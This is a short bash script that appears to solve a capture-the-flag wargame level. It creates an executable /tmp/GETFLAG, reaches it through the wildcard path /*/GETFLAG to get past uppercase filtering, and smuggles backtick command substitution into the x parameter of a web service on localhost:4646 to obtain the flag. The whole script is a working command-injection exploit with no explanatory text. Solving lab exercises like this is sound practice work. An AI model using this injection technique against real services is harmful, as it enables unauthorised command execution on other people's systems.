#!/bin/bash
GETFLAG_OUPUT="/tmp/getflag_output"

set -x

# create a script with an uppercase name
echo "getflag > $GETFLAG_OUPUT" > /tmp/GETFLAG
chmod +x /tmp/GETFLAG

# Simple test:
# Try to execute it with a wildcard, because /tmp would be transform as /TMP
/*/GETFLAG
cat $GETFLAG_OUPUT

# Inject the command in x parameter
curl -s localhost:4646?x=\`/*/GETFLAG\`

# Finally get the flag
cat $GETFLAG_OUPUT